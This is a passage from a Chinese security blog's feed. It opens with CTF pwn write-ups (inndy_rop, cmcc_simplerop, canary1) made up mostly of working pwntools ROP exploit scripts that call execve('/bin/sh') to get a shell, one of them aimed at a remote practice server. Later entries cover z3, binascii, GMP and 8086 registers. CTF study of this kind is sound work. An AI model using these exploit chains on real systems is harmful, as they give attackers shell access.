class="number">0x0805466b</span>)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>)  <span class="comment"># pop ebx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>)  <span class="comment"># @ .data</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de769</span>)  <span class="comment"># pop ecx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>)  <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806c943</span>)  <span class="comment"># int 0x80</span></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = shellcode()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行没有问题:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230812234652868.png" alt="image-20230812234652868"></p><p>然后我想自己构造(具体知识见百度[ctf rop]…):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pop_eax_ret_addr = <span class="number">0x080b8016</span></span><br><span class="line">pop_edx_ecx_ebx_ret_addr = <span class="number">0x0806ed00</span></span><br><span class="line">sh_addr = <span class="number">0x080be47d</span></span><br><span class="line">int_0x80_addr = <span class="number">0x0806c943</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xc</span>+<span class="number">4</span>) + p32(pop_eax_ret_addr) + p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx_ret_addr) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) +p32(sh_addr)+p32(int_0x80_addr)</span><br></pre></td></tr></table></figure><p>但是sh_addr不行,因为sys_execve()要使用’&#x2F;bin&#x2F;bash’,所以这里应该手动注入:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230812235420260.png" alt="image-20230812235420260" style="zoom:50%;" /><p>截图取自<a href="https://blog.csdn.net/qq_73149934/article/details/128430238">https://blog.csdn.net/qq_73149934/article/details/128430238</a></p><p>这里先放个记录,回头再看看</p><h2 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a>cmcc_simplerop</h2><p>这个题也是rop,不过用ROPgadget生成的shellcode跑不通,手动写的syscall可以过</p><p>checksec发现没有PIE,开了NX</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813120940170.png" alt="image-20230813120940170" style="zoom:45%;" /><p>题目很简单,就是直接让read溢出,这里的思路是用系统调用11来用execve进行getshell</p><p>先计算个偏移(IDA里直接看的有误):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813125157314.png" alt="image-20230813125157314"></p><p>生成一串数字复制下来然后调试:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813125237078.png" alt="image-20230813125237078"></p><p>输入那串字符:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813125253822.png" alt="image-20230813125253822"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813125318034.png" alt="image-20230813125318034"></p><p>这里提示了一个无效地址,然后再运行这个命令:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813125359575.png" alt="image-20230813125359575"></p><p>找到偏移32(即0x20)</p><p>接下来分析rop,用ROPgadget发现没有’&#x2F;bin&#x2F;sh\x00’这个字符串,所幸有read函数,那么首先要用栈溢出将返回地址返回到read函数来将其注入到.bss段(这道题没有开启PIE，bss的地址就是绝对地址)</p><p>如此有第一段payload如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ret to read() --- read &#x27;/bin/sh&#x27;</span></span><br><span class="line">read_addr = <span class="number">0x0806CD50</span></span><br><span class="line"><span class="comment"># bin_sh_addr 为从.bss段中找的足够长的一段内存</span></span><br><span class="line">bin_sh_addr = <span class="number">0x080EAFBF</span></span><br><span class="line"><span class="comment">#最后的0x8为接下来要输入的&#x27;/bin/sh\x00&#x27;字符串的长度</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span>) + p32(read_addr) + p32(pop_edx_ecx_ebx_ret_addr) + p32(<span class="number">0</span>) + p32(bin_sh_addr) + p32(<span class="number">0x8</span>)</span><br></pre></td></tr></table></figure><p>再接下来就是系统调用,知识见inndy_rop的WP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># syscall --- execve</span></span><br><span class="line">payload += p32(pop_eax_ret_addr) + p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx_ret_addr) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bin_sh_addr) + p32(int_0x80_addr)</span><br></pre></td></tr></table></figure><p>最后记得要多加一个字符串的输入:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>最后总的代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26428</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./rop&#x27;)</span></span><br><span class="line"></span><br><span class="line">pop_eax_ret_addr = <span class="number">0x080bae06</span></span><br><span class="line">pop_edx_ecx_ebx_ret_addr = <span class="number">0x0806e850</span></span><br><span class="line">sh_addr = <span class="number">0x080c1a9d</span></span><br><span class="line">int_0x80_addr = <span class="number">0x080493e1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ret to read() --- read &#x27;/bin/sh&#x27;</span></span><br><span class="line">read_addr = <span class="number">0x0806CD50</span></span><br><span class="line"><span class="comment"># bin_sh_addr 为从.bss段中找的足够长的一段内存</span></span><br><span class="line">bin_sh_addr = <span class="number">0x080EAFBF</span></span><br><span class="line"><span class="comment"># 最后的0x8为接下来要输入的&#x27;/bin/sh\x00&#x27;字符串的长度</span></span><br><span class="line"><span class="comment"># 0x20的偏移需要使用调试去动态检查出来(cyclic -l 0x61616169)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span>) + p32(read_addr) + p32(pop_edx_ecx_ebx_ret_addr) + p32(<span class="number">0</span>) + p32(bin_sh_addr) + p32(<span class="number">0x8</span>)</span><br><span class="line"><span class="comment"># syscall --- execve</span></span><br><span class="line">payload += p32(pop_eax_ret_addr) + p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx_ret_addr) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bin_sh_addr) + p32(int_0x80_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面的是失败的ropchain(ROPgadget生成的)</span></span><br><span class="line"><span class="comment"># def shellcode():</span></span><br><span class="line"><span class="comment">#     p = b&#x27;a&#x27; * 0x20</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0806e82a)  # pop edx ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea060)  # @ .data</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080bae06)  # pop eax ; ret</span></span><br><span class="line"><span class="comment">#     p += b&#x27;/bin&#x27;</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0809a15d)  # mov dword ptr [edx], eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0806e82a)  # pop edx ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea064)  # @ .data + 4</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080bae06)  # pop eax ; ret</span></span><br><span class="line"><span class="comment">#     p += b&#x27;//sh&#x27;</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0809a15d)  # mov dword ptr [edx], eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0806e82a)  # pop edx ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea068)  # @ .data + 8</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x08054250)  # xor eax, eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0809a15d)  # mov dword ptr [edx], eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080481c9)  # pop ebx ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea060)  # @ .data</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0806e851)  # pop ecx ; pop ebx ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea068)  # @ .data + 8</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea060)  # padding without overwrite ebx</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0806e82a)  # pop edx ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080ea068)  # @ .data + 8</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x08054250)  # xor eax, eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x0807b27f)  # inc eax ; ret</span></span><br><span class="line"><span class="comment">#     p += pack(&#x27;&lt;I&#x27;, 0x080493e1)  # int 0x80</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     return p</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = shellcode()</span></span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813121936742.png" alt="image-20230813121936742" style="zoom:45%;" /><p>结束…</p><h2 id="canary1"><a href="#canary1" class="headerlink" title="canary1"></a>canary1</h2><p>关于canary…百度复习吧…</p><p>绕过方法:</p><p>​1.大量fork的题: 使用逐字节爆破的方法</p><p>​2.字符串输出泄露canary</p><p>​3.GOT表劫持</p><p>但是…这道题是假的canary!!!</p><p>虽然checksec显示有canary…但是…</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813223357926.png" alt="image-20230813223357926" style="zoom:50%;" /><p>看汇编也能看出来,xor的结果根本就没有用到,下面是无条件跳转到call之后:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813223656235.png" alt="image-20230813223656235" style="zoom:50%;" /><p>而且实际编写脚本也能发现0x20的输入长度根本不足以溢出到覆盖所谓canary的开头的00字节:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813223739191.png" alt="image-20230813223739191" style="zoom:50%;" /><p>所以实际上就是个常规溢出,这里是syscall的getshell方式,而且题目中已经存在’&#x2F;bin&#x2F;sh’了…</p><p>本来这个题原本是用字符串溢出来泄露canary的…但是被某大佬patch掉了…orz</p><p>代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&#x27;node4.buuoj.cn&#x27;, 26428)</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./canary1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># syscall</span></span><br><span class="line">string = <span class="string">&#x27;what do you want to say:\n&#x27;</span></span><br><span class="line">paddings = <span class="number">0x28</span></span><br><span class="line">bin_sh_addr = <span class="number">0x000000006b90f0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这里注意64位传参的前三个参数依次为rdi,rsi,rdx</span></span><br><span class="line">pop_rax_ret_addr = <span class="number">0x00000000004005af</span></span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x00000000004006a6</span></span><br><span class="line">pop_rsi_ret_addr = <span class="number">0x0000000000410183</span></span><br><span class="line">pop_rdx_ret_addr = <span class="number">0x000000000044b5c6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 要使用syscall而不是x86的int_0x80</span></span><br><span class="line"><span class="comment"># 使用ROPgadget --binary canary1 --only syscall查找得到</span></span><br><span class="line"><span class="comment"># int_0x80_addr = 0x0000000000417f2f</span></span><br><span class="line">syscall_addr = <span class="number">0x00000000004012fc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意此题为64位，系统调用和32位不同，所以不能使用11的方法，这里使用0x3b(59)</span></span><br><span class="line"><span class="comment"># 其他的基本一致</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * paddings + p64(pop_rax_ret_addr) + p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(pop_rsi_ret_addr) + p64(<span class="number">0</span>) + p64(pop_rdx_ret_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;How to bypass canary:  \n&quot;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(string, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行结果:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230813223307551.png" alt="image-20230813223307551"></p><p>结束…</p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> PWN </tag>
            
            <tag> NX </tag>
            
            <tag> mprotect </tag>
            
            <tag> rop </tag>
            
            <tag> syscall </tag>
            
            <tag> canary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用算法库</title>
      <link href="/2023-08-03-e1a64ca7ff81/"/>
      <url>/2023-08-03-e1a64ca7ff81/</url>
      
        <content type="html"><![CDATA[<h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><h2 id="IDA-Python"><a href="#IDA-Python" class="headerlink" title="IDA Python"></a>IDA Python</h2><p>顾名思义,在IDA中写python脚本,用来提取数据等</p><p>用到idc_bc695这个库</p><p>另见:</p><p>​<a href="https://blog.csdn.net/m0_52164435/article/details/124878537">https://blog.csdn.net/m0_52164435/article/details/124878537</a></p><h2 id="数学库"><a href="#数学库" class="headerlink" title="数学库"></a>数学库</h2><h3 id="z3库"><a href="#z3库" class="headerlink" title="z3库"></a>z3库</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>需要使用python3(python2已不再受支持,安装很可能出现问题)来安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install z3</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上面命令失败的话可以尝试</span></span><br><span class="line">pip install z3-solver</span><br></pre></td></tr></table></figure><h4 id="声明求解范围"><a href="#声明求解范围" class="headerlink" title="声明求解范围"></a>声明求解范围</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Int()和Ints()函数用于申请整数解</span></span><br><span class="line">a = Int(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">a,b = Ints(<span class="string">&#x27;a b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有理数解</span></span><br><span class="line">a = Real(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">a, b = Reals(<span class="string">&quot;a b&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 位向量，用于求解与/或/移位等位运算</span></span><br><span class="line"><span class="comment"># 第二个参数表示位数</span></span><br><span class="line">a = BitVec(<span class="string">&quot;a&quot;</span>, <span class="number">8</span>)</span><br><span class="line">a, b = BitVecs(<span class="string">&quot;a b&quot;</span>, <span class="number">8</span>)</span><br></pre></td></tr></table></figure><h4 id="增加方程约束"><a href="#增加方程约束" class="headerlink" title="增加方程约束"></a>增加方程约束</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#建立求解器</span></span><br><span class="line">S=Solver()</span><br><span class="line"><span class="comment">#添加约束</span></span><br><span class="line">equs=[</span><br><span class="line">    a+b==<span class="number">10</span>,</span><br><span class="line">    a-b==<span class="number">6</span></span><br><span class="line">]</span><br><span class="line">S.add(equs)</span><br><span class="line"><span class="comment">#也可以一个一个加</span></span><br><span class="line">S.add(a+b==<span class="number">10</span>)</span><br></pre></td></tr></table></figure><h4 id="求解"><a href="#求解" class="headerlink" title="求解"></a>求解</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(s.check())   <span class="comment"># sat代表有解，unsat代表无解</span></span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure><h2 id="数据处理库"><a href="#数据处理库" class="headerlink" title="数据处理库"></a>数据处理库</h2><h3 id="二进制-字符处理—binascii"><a href="#二进制-字符处理—binascii" class="headerlink" title="二进制-字符处理—binascii"></a>二进制-字符处理—binascii</h3><p>参阅<a href="https://blog.csdn.net/asmartkiller/article/details/114704320">https://blog.csdn.net/asmartkiller/article/details/114704320</a></p><p>主要用于二进制和ASCII互相转换</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230922171158471.png" alt="image-20230922171158471"></p><p>转为二进制数据bin_var后,如果进一步转为字符串,那么进行<code>bin_var.decode()</code>即可</p><p>例如<code>（SUCTF2019）SignIn</code>中使用<code>binascii.unhexlify()</code>方法将生成的十六进制字符串转为字符串</p><h1 id="C"><a href="#C" class="headerlink" title="C"></a>C</h1><h2 id="高精度—GMP库"><a href="#高精度—GMP库" class="headerlink" title="高精度—GMP库"></a>高精度—GMP库</h2><p>　GMP(The GNU Multiple Precision Arithmetic Library)又叫GNU多精度算术库，是一个提供了很多操作高精度的大整数，浮点数的运算的算术库，几乎没有什么精度方面的限制，功能丰富。我刚接触到这个东西的时候是在学习PHP的过程中。GMP的主要目标应用领域是密码学的应用和研究、 互联网安全应用、 代数系统、 计算代数研究等。</p><h3 id="gmpz-init-set-str-函数"><a href="#gmpz-init-set-str-函数" class="headerlink" title="__gmpz_init_set_str() 函数"></a>__gmpz_init_set_str() 函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mpz_init_set_str</span> <span class="params">(<span class="type">mpz_t</span> rop, <span class="type">char</span> *str, <span class="type">int</span> base)</span></span><br></pre></td></tr></table></figure><p>将str字符数组以 base 指定的进制解读成数值并写入 rop 所指向的内存</p><h3 id="gmpz-powm-函数"><a href="#gmpz-powm-函数" class="headerlink" title="__gmpz_powm() 函数"></a>__gmpz_powm() 函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __gmpz_powm(<span class="type">mpz_t</span> rop, <span class="type">const</span> <span class="type">mpz_t</span> base, <span class="type">const</span> <span class="type">mpz_t</span> <span class="built_in">exp</span>, <span class="type">const</span> <span class="type">mpz_t</span> mod)</span><br></pre></td></tr></table></figure><p>将base求exp次幂,然后对mod求模,最后把结果存到rop中(可以用于编写RSA)</p><p>其他函数见文档</p>]]></content>
      
      
      <categories>
          
          <category> 知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编学习笔记1---寄存器</title>
      <link href="/2023-07-31-5933f1aa9e05/"/>
      <url>/2023-07-31-5933f1aa9e05/</url>
      
        <content type="html"><![CDATA[<h1 id="8086寄存器"><a href="#8086寄存器" class="headerlink" title="8086寄存器"></a>8086寄存器</h1><p>不同CPU的寄存器个数结构不同,对于8086CPU,有14个寄存器,分为:</p><p>​AX,BX,CX,DX,SI,DI,SP,BP,IP,CS,SS,DS,ES,PSW</p><h1 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h1><p>在x86架构的汇编语言中ax,bx,cx,dx是通用寄存器,用于存储数据或进行算术运算。这些寄存器的功能区别如下：</p><ol><li>AX (Accumulator): AX寄存器是累加器寄存器,用于执行算术和逻辑操作,以及存放函数返回值。在乘法和除法运算中,AX寄存器存储乘法的结果或除法的被除数。</li><li>BX (Base Register): BX寄存器通常用作基址寄存器,用于存放内存访问中的偏移地址。在一些特殊情况下,BX也可以用作通用寄存器。</li><li>CX (Count Register): CX寄存器通常用作计数器,特别是在循环操作中。它可以作为循环的计数值,并在循环执行过程中递减。</li><li>DX (Data Register): DX寄存器常用于存放一些数据,例如乘法的乘数或除法的除数。</li></ol><p>8086的寄存器均为16位,一个16位寄存器又可分为两部分,即kH,kL(k为A,B,C,D),各为一个字节(2字节&#x2F;16位为一个字)</p><h2 id="AX寄存器"><a href="#AX寄存器" class="headerlink" title="AX寄存器"></a>AX寄存器</h2><p>​AX寄存器一般用来存储临时数据,存储函数返回值,存储控制信息等,所以经常被用于MOV指令</p><h2 id="BX寄存器"><a href="#BX寄存器" class="headerlink" title="BX寄存器"></a>BX寄存器</h2><p>​BX寄存器通常用于内存寻址,即用于存储内存地址或作为其他寄存器的间接寻址寄存器</p><p>​例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MOV BX, 2000h    ; 将数据2000h传送到BX寄存器，作为内存地址</span><br><span class="line">MOV 